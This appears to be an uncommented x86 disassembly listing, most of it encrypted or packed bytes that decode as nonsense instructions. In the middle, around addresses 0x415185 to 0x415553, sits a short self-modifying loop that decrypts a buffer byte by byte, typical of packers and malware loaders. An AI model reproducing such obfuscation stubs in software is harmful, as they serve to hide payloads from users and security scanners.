  414e79:	mov    bh,0xa0
  414e7b:	sbb    DWORD PTR [edx-0x59c19734],eax
  414e81:	push   eax
  414e82:	sbb    DWORD PTR [ecx],0x70b88c67
  414e88:	mov    bl,0x8a
  414e8a:	push   ebx
  414e8b:	dec    edx
  414e8c:	cli    
  414e8d:	test   al,0x7e
  414e8f:	add    al,0xa5
  414e91:	mov    WORD PTR [esi+0x3a],fs
  414e94:	push   cs
  414e95:	jno    0x414e28
  414e97:	aaa    
  414e98:	cli    
  414e99:	xchg   ebx,eax
  414e9a:	retf   0x9e4a
  414e9d:	fadd   DWORD PTR [ecx-0x1a]
  414ea0:	(bad)  
  414ea1:	loop   0x414e7e
  414ea3:	and    ah,ch
  414ea5:	jecxz  0x414e7a
  414ea7:	imul   ebp,DWORD PTR [edx-0x761d3e49],0x1f
  414eae:	or     bh,al
  414eb0:	inc    ecx
  414eb1:	mov    esp,0x7d990720
  414eb6:	ins    DWORD PTR es:[edi],dx
  414eb7:	aad    0x4b
  414eb9:	cmp    esp,edi
  414ebb:	mov    bh,0xcc
  414ebd:	xchg   ebx,eax
  414ebe:	jne    0x414e96
  414ec0:	jmp    0xe9a6f789
  414ec5:	sub    al,0xc8
  414ec7:	fsubp  st(0),st
  414ec9:	stc    
  414eca:	leave  
  414ecb:	arpl   WORD PTR [edx-0x77],bp
  414ece:	cli    
  414ecf:	fcom   DWORD PTR [edi-0x1d]
  414ed2:	mov    eax,0x4e5b1426
  414ed7:	in     al,dx
  414ed8:	inc    edi
  414ed9:	sar    DWORD PTR [eax],1
  414edb:	xchg   esi,eax
  414edc:	xlat   BYTE PTR ds:[ebx]
  414edd:	add    al,0x1d
  414edf:	cmp    BYTE PTR [edx+0x4710cba5],dh
  414ee5:	jg     0x414ea0
  414ee7:	adc    al,0x89
  414ee9:	nop
  414eea:	cmp    bl,BYTE PTR [edx+0xe6c0169]
  414ef0:	mul    BYTE PTR [ebp-0x43b37d9b]
  414ef6:	cmp    eax,DWORD PTR [eax]
  414ef8:	loope  0x414ebf
  414efa:	fbstp  TBYTE PTR ds:[edi-0x7e]
  414efe:	pop    eax
  414eff:	(bad)  
  414f00:	test   al,0x8d
  414f02:	nop
  414f03:	cs push esp
  414f05:	fcomip st,st(2)
  414f07:	xchg   esp,eax
  414f08:	jno    0x414ec6
  414f0a:	adc    ebp,ebp
  414f0c:	out    dx,eax
  414f0d:	adc    al,0xb6
  414f0f:	ja     0x414f5f
  414f11:	sbb    BYTE PTR [eax+0xf71a191],0x3b
  414f18:	mov    BYTE PTR [ebx-0x21],bh
  414f1b:	mov    ebp,0x34c1f0e2
  414f20:	(bad)  
  414f21:	enter  0xeab4,0x1e
  414f25:	ret    0x5038
  414f28:	push   edi
  414f29:	dec    edi
  414f2a:	pop    ds
  414f2b:	push   eax
  414f2c:	add    al,0x41
  414f2e:	cs xchg esp,eax
  414f30:	ret    0x35ea
  414f33:	xchg   ecx,eax
  414f34:	jp     0x414ee4
  414f36:	and    ecx,DWORD PTR [edx+0x2024c930]
  414f3c:	mov    ah,0xb1
  414f3e:	icebp  
  414f3f:	xchg   DWORD PTR [edx+edi*1-0x1aaa2545],edi
  414f46:	inc    ebp
  414f47:	test   BYTE PTR [eax-0x4621c228],bl
  414f4d:	test   al,0x79
  414f4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f50:	or     al,0xf7
  414f52:	pop    esp
  414f53:	xchg   ebx,eax
  414f54:	data16 fistp DWORD PTR [ebp-0x430750f4]
  414f5b:	push   edi
  414f5c:	add    ecx,DWORD PTR [edx+0x42]
  414f5f:	aam    0x1a
  414f61:	imul   edx,eax,0x94f5118e
  414f67:	loope  0x414fbb
  414f69:	hlt    
  414f6a:	jno    0x414f3b
  414f6c:	sub    dh,al
  414f6e:	clc    
  414f6f:	(bad)  
  414f70:	std    
  414f71:	ret    
  414f72:	cmp    al,0x23
  414f74:	or     eax,0xc5f7bafc
  414f79:	cmp    BYTE PTR [edx+0x658b01ed],bh
  414f7f:	jge    0x414f4b
  414f81:	imul   ebx,DWORD PTR [ecx-0x78],0xae1ecd12
  414f88:	xor    esi,DWORD PTR [ebp-0x5]
  414f8b:	mov    WORD PTR [edx-0x329fb531],cs
  414f91:	aas    
  414f92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f93:	add    ch,BYTE PTR [ebp-0x2e]
  414f96:	sub    BYTE PTR cs:0xc04485bd,bl
  414f9d:	jmp    0xdcbb:0xa206514e
  414fa4:	cs jle 0x414f75
  414fa7:	sbb    eax,esp
  414fa9:	scas   al,BYTE PTR es:[edi]
  414faa:	pop    edx
  414fab:	jo     0x414fa3
  414fad:	push   ebp
  414fae:	pop    edx
  414faf:	imul   ecx,ebx,0x5459d01
  414fb5:	lods   eax,DWORD PTR ds:[esi]
  414fb6:	xor    DWORD PTR [eax+ecx*8+0x6d],ebx
  414fba:	and    ebp,esi
  414fbc:	jl     0x414fdb
  414fbe:	pushf  
  414fbf:	mov    ebp,0xaedd7a24
  414fc4:	cmc    
  414fc5:	xor    BYTE PTR [esi],al
  414fc7:	mov    ebp,0xbcbdd730
  414fcc:	and    DWORD PTR fs:0xa17e5872,0xfffffff4
  414fd4:	je     0x414f9f
  414fd6:	retf   0x9b5b
  414fd9:	and    edx,DWORD PTR [ebx-0x50]
  414fdc:	mov    bl,0xee
  414fde:	pop    ecx
  414fdf:	lods   eax,DWORD PTR ds:[esi]
  414fe0:	sub    eax,0xff1276f
  414fe5:	outs   dx,DWORD PTR ds:[esi]
  414fe6:	jb     0x414f74
  414fe8:	(bad)  
  414fe9:	add    dh,0x37
  414fec:	add    DWORD PTR [esi+eiz*4],0x2bc1253e
  414ff3:	inc    eax
  414ff4:	lods   eax,DWORD PTR ds:[esi]
  414ff5:	sahf   
  414ff6:	iret   
  414ff7:	mov    esp,ebx
  414ff9:	dec    eax
  414ffa:	sub    eax,0xfaa178e1
  414fff:	cs jo  0x41506c
  415002:	mov    bl,0x0
  415004:	data16 adc al,BYTE PTR [edi]
  415007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415008:	xor    eax,0xd5e415e1
  41500d:	sbb    al,0x4f
  41500f:	int    0xf9
  415011:	mov    dh,0x45
  415013:	inc    eax
  415014:	loope  0x41504b
  415016:	sbb    ecx,edi
  415018:	mov    esp,0xb1c57d59
  41501d:	cdq    
  41501e:	(bad)  
  41501f:	jns    0x414fe4
  415021:	mov    ebx,0x10ca8ea4
  415026:	jo     0x414fc4
  415028:	pop    esi
  415029:	daa    
  41502a:	out    0xe0,al
  41502c:	addr16 mov ch,0x5
  41502f:	or     BYTE PTR [ecx+0x12],al
  415032:	jle    0x414fea
  415034:	mov    ecx,0xd2d70aca
  415039:	rcl    esp,0xe4
  41503c:	push   edi
  41503d:	xchg   esi,eax
  41503e:	retf   
  41503f:	lea    esp,[ebp+0x3e3529cf]
  415045:	out    dx,eax
  415046:	(bad)  
  415048:	jg     0x414ff6
  41504a:	call   0xa6ca4095
  41504f:	add    dh,dh
  415051:	sub    eax,0xd906eb9c
  415056:	leave  
  415057:	icebp  
  415058:	sub    DWORD PTR [ebp+0x6f1a7933],ebp
  41505e:	sub    dl,BYTE PTR [esi-0x3f]
  415061:	jbe    0x415098
  415063:	bnd js 0x415004
  415066:	and    DWORD PTR [ebx+0x221b4d49],eax
  41506c:	addr16 jns 0x415095
  41506f:	mov    ds,WORD PTR [ecx+0x2a]
  415072:	retf   0xcadf
  415075:	mov    ch,BYTE PTR cs:[edx+0x46]
  415079:	push   ebx
  41507a:	icebp  
  41507b:	add    dh,BYTE PTR [edx]
  41507d:	aam    0x72
  41507f:	ins    DWORD PTR es:[edi],dx
  415080:	add    bh,BYTE PTR [esi]
  415082:	mov    eax,ds:0xb0e7f287
  415087:	xchg   esp,eax
  415088:	ins    DWORD PTR es:[edi],dx
  415089:	scas   eax,DWORD PTR es:[edi]
  41508a:	push   ebx
  41508b:	cli    
  41508c:	cmp    bh,dl
  41508e:	and    ch,BYTE PTR [ebx]
  415090:	lahf   
  415091:	imul   esp,DWORD PTR [eax+eiz*1],0x6c
  415095:	and    ebp,0x4fd576b2
  41509b:	and    al,0x63
  41509d:	cwde   
  41509e:	xor    eax,0xa4eff840
  4150a3:	iret   
  4150a4:	sti    
  4150a5:	pop    esi
  4150a6:	xor    al,0xe0
  4150a8:	or     eax,0x4908e839
  4150ad:	or     al,0xb
  4150af:	inc    edi
  4150b0:	pop    esp
  4150b1:	shl    esi,cl
  4150b3:	(bad)  
  4150b4:	stc    
  4150b5:	mov    dh,0xac
  4150b7:	jb     0x4150d7
  4150b9:	cmp    BYTE PTR [esi],bh
  4150bb:	sbb    dl,BYTE PTR [ebx-0x28]
  4150be:	pop    es
  4150bf:	dec    esp
  4150c0:	cmp    BYTE PTR [edi-0x1c0ad6f],dl
  4150c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150c7:	xor    al,0x98
  4150c9:	fbstp  TBYTE PTR [ebp-0x40bc870a]
  4150cf:	add    DWORD PTR [edi+eax*1-0x53],0x8ed383db
  4150d7:	or     dl,BYTE PTR [edx+ebp*2+0x6c05c832]
  4150de:	and    al,0xb8
  4150e0:	dec    ebp
  4150e1:	inc    ebp
  4150e2:	xchg   edx,eax
  4150e3:	ja     0x415130
  4150e5:	xchg   ebx,eax
  4150e6:	scas   eax,DWORD PTR es:[edi]
  4150e7:	cmp    ch,BYTE PTR [edi+0x31fb24fa]
  4150ed:	adc    al,0xa7
  4150ef:	mov    bh,0x42
  4150f1:	mov    al,0x18
  4150f3:	iret   
  4150f4:	pop    esi
  4150f5:	cwde   
  4150f6:	ja     0x41516b
  4150f8:	jb     0x4150c9
  4150fa:	fwait
  4150fb:	test   eax,0xe5f300c9
  415100:	gs aad 0x4a
  415103:	mov    ds:0xa32ec3b3,al
  415108:	out    0x23,al
  41510a:	aad    0xe7
  41510c:	xchg   BYTE PTR [ebx+0x41],dh
  41510f:	sub    eax,0xf532345c
  415114:	mov    DWORD PTR [ebp+0x44b591de],esi
  41511a:	popa   
  41511b:	cld    
  41511c:	dec    edi
  41511d:	lods   al,BYTE PTR ds:[esi]
  41511e:	dec    edi
  41511f:	icebp  
  415120:	fwait
  415121:	sti    
  415122:	or     edx,ecx
  415124:	mov    cl,0x80
  415126:	push   edx
  415127:	clc    
  415128:	jl     0x415131
  41512a:	int    0xdd
  41512c:	xor    eax,0x2c81b2dd
  415131:	mov    bh,0xc9
  415133:	mov    ch,0x5d
  415135:	call   0x61deeeb1
  41513a:	sbb    al,BYTE PTR [ecx-0x5fbe9ef5]
  415140:	mov    bl,dh
  415142:	pop    ss
  415143:	and    eax,0x8b3fa453
  415148:	(bad)
  41514b:	add    ch,BYTE PTR ds:0x28b1ff06
  415151:	in     al,dx
  415152:	or     al,0xbb
  415154:	add    eax,0x3e165334
  415159:	aas    
  41515a:	pop    ecx
  41515b:	pop    esi
  41515c:	or     BYTE PTR [ebx+0x3a],dl
  41515f:	(bad)  
  415160:	hlt    
  415161:	and    ch,dl
  415163:	jmp    0x4151b5
  415165:	sub    al,0xdc
  415167:	and    ah,BYTE PTR ds:0x2c467fc5
  41516d:	cmp    eax,0x2247066d
  415172:	mov    esp,DWORD PTR [ecx]
  415174:	cmp    DWORD PTR [ecx-0x79],0xe60ef631
  41517b:	jp     0x4151a6
  41517d:	push   0xa6840f84
  415182:	pop    es
  415183:	add    BYTE PTR [eax],al
  415185:	mov    DWORD PTR [ebp-0x18],0x1001
  41518c:	mov    edx,DWORD PTR [ebp-0x1c]
  41518f:	xor    ecx,ecx
  415191:	test   edx,edx
  415193:	jmp    0x4154cc
  415198:	jno    0x4151dd
  41519a:	mov    edx,0xb9bcbc52
  41519f:	fs inc eax
  4151a1:	sub    BYTE PTR [edx],bh
  4151a3:	xchg   edx,eax
  4151a4:	fiadd  DWORD PTR [esi-0x4fc32290]
  4151aa:	mov    esi,0xbec4edbe
  4151af:	mov    esi,0x8a7fdce5
  4151b4:	sub    ebp,DWORD PTR [ebp+ecx*8+0x6f0ca57b]
  4151bb:	pop    es
  4151bc:	(bad)  [eax+eax*4]
  4151bf:	sbb    DWORD PTR [ebp-0x3abdfab],edx
  4151c5:	push   cs
  4151c6:	xor    al,0x5e
  4151c8:	push   es
  4151c9:	push   ecx
  4151ca:	mov    bl,0xc9
  4151cc:	(bad)  
  4151cd:	pop    eax
  4151ce:	cmp    ecx,0x79
  4151d1:	xchg   ecx,eax
  4151d2:	ins    DWORD PTR es:[edi],dx
  4151d3:	dec    ebx
  4151d4:	and    DWORD PTR [edx+0x51],ebx
  4151d7:	xor    BYTE PTR [edx+0x3d],0xfb
  4151db:	aad    0x74
  4151dd:	dec    eax
  4151de:	pop    ebx
  4151df:	int3   
  4151e0:	xchg   ecx,eax
  4151e1:	retf   0x6189
  4151e4:	aad    0x5e
  4151e6:	das    
  4151e7:	push   esi
  4151e8:	xchg   esp,eax
  4151e9:	push   ecx
  4151ea:	lods   eax,DWORD PTR ds:[esi]
  4151eb:	inc    ebp
  4151ec:	fld    TBYTE PTR [ebp-0x14591fdc]
  4151f2:	cmp    al,0xc3
  4151f4:	popf   
  4151f5:	(bad)  
  4151f7:	or     edx,esp
  4151f9:	xchg   esp,eax
  4151fa:	es push ecx
  4151fc:	xor    DWORD PTR [edi],esi
  4151fe:	es or  esp,ecx
  415201:	imul   ebx,DWORD PTR [edi],0x2392c67b
  415207:	mul    cl
  415209:	(bad)  
  41520a:	cmp    edi,DWORD PTR [esi]
  41520c:	pop    ebx
  41520d:	or     ch,BYTE PTR [ecx+0x63583672]
  415213:	sub    al,0xec
  415215:	ins    BYTE PTR es:[edi],dx
  415216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415217:	jge    0x4151e2
  415219:	jecxz  0x415287
  41521b:	mov    dh,0x2e
  41521d:	or     DWORD PTR [edx+eax*8+0x27],eax
  415221:	fs gs push eax
  415224:	cwde   
  415225:	jp     0x4151ed
  415227:	dec    esi
  415228:	mov    ch,cl
  41522a:	pop    ss
  41522b:	push   eax
  41522c:	fmul   DWORD PTR [ebx-0xc]
  41522f:	int    0x98
  415231:	push   edx
  415232:	pop    edx
  415233:	jb     0x415265
  415235:	in     eax,0x10
  415237:	dec    ebp
  415238:	adc    BYTE PTR [ecx-0x6],0x77
  41523c:	ja     0x415245
  41523e:	mov    ds:0x5cada0e0,eax
  415243:	mov    al,ds:0xbc259a80
  415248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415249:	imul   esi,DWORD PTR [esi-0x65795884],0xffffffe2
  415250:	lds    ebx,FWORD PTR [ebp+0x78]
  415253:	xor    DWORD PTR ds:0x71c222f6,0x88f66926
  41525d:	jle    0x41523e
  41525f:	mov    ds:0xa70c8e8f,eax
  415264:	xor    DWORD PTR [eiz*2-0x756d6d00],ebx
  41526b:	xor    dh,BYTE PTR [eax+0x20]
  41526e:	daa    
  41526f:	push   esi
  415270:	sbb    esi,eax
  415272:	test   DWORD PTR [edi+esi*4-0x3d1a4536],0x6fd7f21e
  41527d:	mov    edi,0x1760ec0
  415282:	cwde   
  415283:	lock arpl WORD PTR [edx+ecx*2],dx
  415287:	rol    BYTE PTR [ecx+0x5d],cl
  41528a:	and    DWORD PTR [esi+0x74],esp
  41528d:	test   eax,0xdbd5eb29
  415292:	jp     0x4152d5
  415294:	sub    bl,bl
  415296:	xlat   BYTE PTR ds:[ebx]
  415297:	inc    ebx
  415298:	jno    0x4152b2
  41529a:	add    BYTE PTR [ebx-0x7f89bfff],bl
  4152a0:	gs stos BYTE PTR es:[edi],al
  4152a2:	bound  ebx,QWORD PTR [edi+edx*4]
  4152a5:	gs mov ecx,0xf7cf3f8a
  4152ab:	push   eax
  4152ac:	and    al,0xc0
  4152ae:	loope  0x415274
  4152b0:	popf   
  4152b1:	loop   0x41525b
  4152b3:	mov    edi,0x150b4694
  4152b8:	xchg   DWORD PTR [edi-0x53d26f5f],ebx
  4152be:	retf   0x2e5d
  4152c1:	sbb    ecx,ebx
  4152c3:	adc    cl,BYTE PTR [eax+ecx*2+0x75cdf04a]
  4152ca:	outs   dx,DWORD PTR ds:[esi]
  4152cb:	pop    ecx
  4152cc:	scas   eax,DWORD PTR es:[edi]
  4152cd:	mov    edi,DWORD PTR [edi+ebx*8-0x59]
  4152d1:	jns    0x415285
  4152d3:	mov    dh,0xe1
  4152d5:	cmp    ah,ch
  4152d7:	sbb    al,0xd7
  4152d9:	xchg   edx,eax
  4152da:	mov    al,ds:0x2d72a9d9
  4152df:	into   
  4152e0:	jmp    0x41535d
  4152e2:	stos   BYTE PTR es:[edi],al
  4152e3:	loop   0x41528e
  4152e5:	nop
  4152e6:	fld    TBYTE PTR [ecx]
  4152e8:	sahf   
  4152e9:	sbb    eax,0x2582d6fd
  4152ee:	and    esp,edi
  4152f0:	pop    edi
  4152f1:	mov    esi,0x1bec30a6
  4152f6:	sbb    BYTE PTR [ebx+ebp*4],cl
  4152f9:	mov    bh,0x90
  4152fb:	mov    al,0x79
  4152fd:	fcomp  QWORD PTR [edx+0x269008d3]
  415303:	pop    edx
  415304:	call   0x388461c1
  415309:	hlt    
  41530a:	test   al,0x81
  41530c:	inc    esi
  41530d:	sub    BYTE PTR [edi+ebp*4+0x75],bl
  415311:	repz xor cl,BYTE PTR [eax-0x29]
  415315:	or     ch,dl
  415317:	dec    esi
  415318:	mov    ch,BYTE PTR [ecx-0x70ff89ae]
  41531e:	aad    0xe6
  415320:	adc    eax,0x507a7ff9
  415325:	cmp    dh,BYTE PTR [ecx]
  415327:	sub    DWORD PTR [esi-0x4a],ebp
  41532a:	adc    eax,0x753f88b5
  41532f:	cmc    
  415330:	adc    ch,bl
  415332:	aam    0x38
  415334:	dec    eax
  415335:	and    eax,DWORD PTR [esi-0x73574eff]
  41533b:	push   esp
  41533c:	stc    
  41533d:	test   BYTE PTR ds:0x33e3eae,dh
  415343:	sub    eax,0xb57870a4
  415348:	push   ss
  415349:	adc    BYTE PTR [ebp+0x2fe664ad],cl
  41534f:	in     al,dx
  415350:	add    esp,DWORD PTR [esi-0xa3a68b4]
  415356:	in     eax,0xf5
  415358:	in     al,0x36
  41535a:	ffreep st(6)
  41535c:	scas   al,BYTE PTR es:[edi]
  41535d:	lods   eax,DWORD PTR ds:[esi]
  41535e:	pop    DWORD PTR [ecx+0x774eda07]
  415364:	add    BYTE PTR [eax-0x1d88b000],al
  41536a:	adc    cl,dl
  41536c:	add    cl,BYTE PTR [edi-0x35]
  41536f:	ret    0xe5d1
  415372:	mov    bl,0xff
  415374:	icebp  
  415375:	sbb    dl,BYTE PTR [edx]
  415377:	int3   
  415378:	icebp  
  415379:	sub    BYTE PTR [esi-0x62],dl
  41537c:	pop    DWORD PTR [ebp-0x62]
  41537f:	pop    edx
  415380:	adc    eax,0x6e8c3999
  415385:	imul   edi,eax,0xffffffab
  415388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415389:	adc    esp,ebp
  41538b:	jno    0x4153fa
  41538d:	and    BYTE PTR [ecx-0x4049c120],dh
  415393:	retf   
  415394:	or     DWORD PTR [edi+0x55],ecx
  415397:	cwde   
  415398:	and    BYTE PTR [esi+eax*2],al
  41539b:	iret   
  41539c:	ds xchg ebx,eax
  41539e:	jmp    0x47f0bf0c
  4153a3:	push   ebx
  4153a4:	je     0x415415
  4153a6:	nop
  4153a7:	mov    WORD PTR [ebp-0x72ceed43],?
  4153ad:	std    
  4153ae:	test   al,0x87
  4153b0:	xchg   BYTE PTR [edi-0x64],ah
  4153b3:	mov    esp,0xa56c4e94
  4153b8:	fwait
  4153b9:	in     al,dx
  4153ba:	push   0xb9b03cf8
  4153bf:	jg     0x415411
  4153c1:	ret    
  4153c2:	xchg   BYTE PTR [ebp-0x720fcdd7],bh
  4153c8:	adc    eax,esi
  4153ca:	arpl   dx,sp
  4153cc:	lahf   
  4153cd:	dec    ebp
  4153ce:	adc    bh,ch
  4153d0:	pop    ebp
  4153d1:	mov    ds:0x440e8c70,al
  4153d6:	lea    ebx,[ebx+esi*8]
  4153d9:	xor    DWORD PTR [ecx+0x27450c8e],edx
  4153df:	sbb    al,0xbe
  4153e1:	sbb    al,0x5b
  4153e3:	sub    ebx,DWORD PTR [ecx]
  4153e5:	jb     0x4153c1
  4153e7:	(bad)  [edi+0x31f76f8a]
  4153ed:	nop
  4153ee:	je     0x41539d
  4153f0:	stos   DWORD PTR es:[edi],eax
  4153f1:	aaa    
  4153f2:	lods   al,BYTE PTR ds:[esi]
  4153f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153f4:	xor    DWORD PTR [esi+0x44],ebp
  4153f7:	iret   
  4153f8:	jecxz  0x41545c
  4153fa:	aad    0x8d
  4153fc:	xor    eax,0x76731c56
  415401:	out    0xf7,al
  415403:	mov    eax,ds:0x55c39ac4
  415408:	inc    esi
  415409:	loope  0x4153e9
  41540b:	push   esp
  41540c:	add    eax,ebp
  41540e:	jae    0x41543a
  415410:	out    0x68,al
  415412:	xchg   ecx,eax
  415413:	popf   
  415414:	pusha  
  415415:	cmp    edi,edi
  415417:	in     al,0x15
  415419:	cwde   
  41541a:	sub    ch,BYTE PTR [edi+0x2ddd61fe]
  415420:	iret   
  415421:	ds xchg bh,ah
  415424:	and    BYTE PTR ds:0x821fa41c,bh
  41542a:	enter  0x3500,0xaa
  41542e:	sar    BYTE PTR ds:0x59a1b40c,cl
  415434:	and    DWORD PTR [edx-0x72],0x25
  415438:	push   esp
  415439:	je     0x41543c
  41543b:	pop    esi
  41543c:	sti    
  41543d:	cwde   
  41543e:	cdq    
  41543f:	adc    DWORD PTR [edx-0x57c5762f],0xb
  415446:	cmp    esi,DWORD PTR [ebx+edx*8]
  415449:	jmp    0xb5d5:0x8362639c
  415450:	mov    ds,ebp
  415452:	dec    ecx
  415453:	sbb    eax,0x712e63a
  415458:	bnd js 0x4154ca
  41545b:	xlat   BYTE PTR ds:[ebx]
  41545c:	test   BYTE PTR [edi+edi*1],dl
  41545f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415460:	push   0x185c3387
  415465:	mov    ecx,0xefae3d14
  41546a:	pushf  
  41546b:	adc    DWORD PTR [esi-0x50],0x6e
  41546f:	pusha  
  415470:	mul    BYTE PTR [esi]
  415472:	sar    BYTE PTR es:[esi+0x4a],cl
  415476:	ins    BYTE PTR es:[edi],dx
  415477:	lds    edi,FWORD PTR [edi]
  415479:	loope  0x415446
  41547b:	or     DWORD PTR [edi+esi*2+0x362a1f6f],edi
  415482:	popa   
  415483:	scas   eax,DWORD PTR es:[edi]
  415484:	jp     0x415443
  415486:	push   ebp
  415487:	loop   0x4154a2
  415489:	mov    DWORD PTR [ebp+ecx*8+0x7e],esi
  41548d:	fcomp  QWORD PTR [eax-0x551b012f]
  415493:	add    ah,cl
  415495:	fldcw  WORD PTR [esi-0x3c93f018]
  41549b:	push   eax
  41549c:	iret   
  41549d:	jmp    0x3c11:0x4b8c46ed
  4154a4:	xor    DWORD PTR [ebx-0x73834a98],ebp
  4154aa:	sbb    al,0x7a
  4154ac:	add    eax,0x66fa6174
  4154b1:	jnp    0x415516
  4154b3:	mov    bl,0xb8
  4154b5:	add    BYTE PTR [bx+si-0x2684],al
  4154ba:	jmp    0xa36b8f50
  4154bf:	aad    0x73
  4154c1:	mov    ch,0xc1
  4154c3:	adc    eax,0xf575d4f9
  4154c8:	in     eax,dx
  4154c9:	out    dx,al
  4154ca:	fucomip st,st(7)
  4154cc:	je     0x415550
  4154d2:	mov    al,BYTE PTR [ecx+edi*1]
  4154d5:	mov    BYTE PTR [ebp-0x1],al
  4154d8:	mov    BYTE PTR [ebp-0x3],0x74
  4154dc:	mov    BYTE PTR [ebp-0x2],0x16
  4154e0:	mov    BYTE PTR [ebp-0x4],0x62
  4154e4:	movzx  eax,BYTE PTR [ebp-0x4]
  4154e8:	movzx  ebx,BYTE PTR [ebp-0x2]
  4154ec:	or     eax,0xd4
  4154f1:	and    eax,ebx
  4154f3:	movzx  ebx,BYTE PTR [ebp-0x3]
  4154f7:	and    eax,ebx
  4154f9:	mov    BYTE PTR [ebp-0x12],al
  4154fc:	mov    BYTE PTR [ebp-0x11],0xfe
  415500:	mov    BYTE PTR [ebp-0x14],0x32
  415504:	mov    BYTE PTR [ebp-0x4],0xc7
  415508:	mov    BYTE PTR [ebp-0x2],0x73
  41550c:	mov    BYTE PTR [ebp-0x3],0xb3
  415510:	mov    al,BYTE PTR [ebp-0x3]
  415513:	mov    bl,BYTE PTR [ebp-0x2]
  415516:	or     al,bl
  415518:	mov    bl,BYTE PTR [ebp-0x4]
  41551b:	sub    al,bl
  41551d:	mov    bl,BYTE PTR [ebp-0x14]
  415520:	imul   bl
  415522:	mov    bl,BYTE PTR [ebp-0x11]
  415525:	sub    al,bl
  415527:	mov    bl,BYTE PTR [ebp-0x12]
  41552a:	cmp    bl,al
  41552c:	ja     0x415541
  415532:	movzx  eax,BYTE PTR [ebp-0x1]
  415536:	sub    eax,0xed
  41553b:	mov    BYTE PTR [ebp-0x1],al
  41553e:	ror    BYTE PTR [ebp-0x1],1
  415541:	mov    al,BYTE PTR [ebp-0x1]
  415544:	mov    BYTE PTR [ecx+edi*1],al
  415547:	inc    ecx
  415548:	cmp    ecx,edx
  41554a:	jb     0x4154d2
  415550:	dec    DWORD PTR [ebp-0x18]
  415553:	jne    0x41518c
  415559:	mov    eax,DWORD PTR [ebp+0x8]
  41555c:	mov    ecx,DWORD PTR [ebp+0xc]
  41555f:	shrd   eax,ecx,0x2
  415563:	shr    ecx,0x2
  415566:	mov    ecx,DWORD PTR [ebp+0x8]
  415569:	mov    edx,DWORD PTR [ebp+0xc]
  41556c:	xor    eax,esi
  41556e:	xor    edx,edx
  415570:	jmp    0x4158a9
  415575:	cmp    dl,BYTE PTR [ebx]
  415577:	inc    esi
  415578:	mov    WORD PTR [eax-0x64],gs
  41557b:	cmp    al,0xb3
  41557d:	mov    ch,0xd8
  41557f:	(bad)  
  415580:	fstp   QWORD PTR [edi+eiz*4-0x3d]
  415584:	iret   
  415585:	ins    BYTE PTR es:[edi],dx
  415586:	mov    dh,0xbe
  415588:	mov    esi,0xbebec4ed
  41558d:	fisttp QWORD PTR [ebp-0x2c]
  415590:	ret    
  415591:	outs   dx,BYTE PTR ds:[esi]
  415592:	xchg   ebx,eax
  415593:	dec    ecx
  415594:	push   edi
  415595:	idiv   esp
  415597:	out    dx,eax
  415598:	lods   eax,DWORD PTR ds:[esi]
  415599:	clc    
  41559a:	jne    0x415528
  41559c:	or     al,BYTE PTR [esp+esi*8+0xb]
  4155a0:	loopne 0x415571
  4155a2:	mov    bh,0xab
  4155a4:	dec    eax
  4155a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155a6:	aas    
  4155a7:	je     0x4155fa
  4155a9:	jne    0x415612
  4155ab:	mov    eax,ds:0x5304ace6
  4155b0:	fwait
  4155b1:	inc    edi
  4155b2:	sub    bl,BYTE PTR [edx]
  4155b4:	xor    DWORD PTR [esi+0x518ee47e],eax
  4155ba:	fsubr  st,st(7)
  4155bc:	adc    cl,ah
  4155be:	fisubr WORD PTR [ebp-0x7cd63c7a]
  4155c4:	mov    bl,0x97
  4155c6:	and    DWORD PTR [ecx],0xffffff87
  4155c9:	in     al,dx
  4155ca:	mov    ch,0xdf
  4155cc:	dec    eax
  4155cd:	sbb    BYTE PTR [ebp-0x77b647d5],dl
  4155d3:	cli    
  4155d4:	push   edi
  4155d5:	ror    BYTE PTR [eax+0x1b],0x1b
  4155d9:	std    
  4155da:	or     DWORD PTR [esi+0x59],ebp
  4155dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155de:	or     BYTE PTR [ebp-0x6816cb74],bl
  4155e4:	sahf   
  4155e5:	sub    eax,0x8ebf645a
  4155ea:	cmc    
  4155eb:	add    eax,0xe139e466
  4155f0:	xchg   esp,eax
  4155f1:	add    BYTE PTR [edx],bl
  4155f3:	pop    ebx
  4155f4:	dec    esp
  4155f5:	mov    bl,0xdf
  4155f7:	cmp    al,cl
  4155f9:	pop    ebp
  4155fa:	test   BYTE PTR [ebx+0x26],al
  4155fd:	add    eax,0x9176e6c1
  415602:	ret    0xf6d2
  415605:	sbb    bh,BYTE PTR [edi+0x4d]
  415608:	test   eax,0x88b6495e
  41560d:	imul   ecx,edi,0x50
  415610:	pop    edi
  415611:	jne    0x41559d
  415613:	jb     0x41564e
  415615:	xchg   ecx,eax
  415617:	inc    edx
  415618:	dec    BYTE PTR [edi-0x641c522]
  41561e:	inc    ecx
  41561f:	cmp    eax,0xb7421be
  415624:	cmp    al,0xdd
  415626:	das    
  415627:	clc    
  415628:	push   eax
  415629:	adc    ebx,ebx
  41562b:	or     eax,0x20331f83
  415630:	dec    edi
  415631:	sbb    al,0x21
  415633:	xor    ah,cl
  415635:	int3   
  415636:	inc    edx
  415637:	aad    0x62
  415639:	xor    edi,ecx
  41563b:	aad    0x3a
  41563d:	push   ebx
  41563e:	jmp    0xa074f1d1
  415643:	mov    ds:0x85b8ed2c,al
  415648:	xor    bh,BYTE PTR [ebx-0x18]
  41564b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41564c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41564d:	push   ebx
  41564e:	sbb    DWORD PTR [ecx-0x1b],esi
  415651:	xor    dh,BYTE PTR [edx-0x76c1a2ce]
  415657:	jmp    FWORD PTR [ecx+edx*2+0x60]
  41565b:	mov    gs,esi
  41565d:	mov    eax,0xfdd0f7e8
  415662:	push   ebp
  415663:	out    0x60,eax
  415665:	gs mov cl,0x88
  415668:	dec    esi
  415669:	ja     0x415600
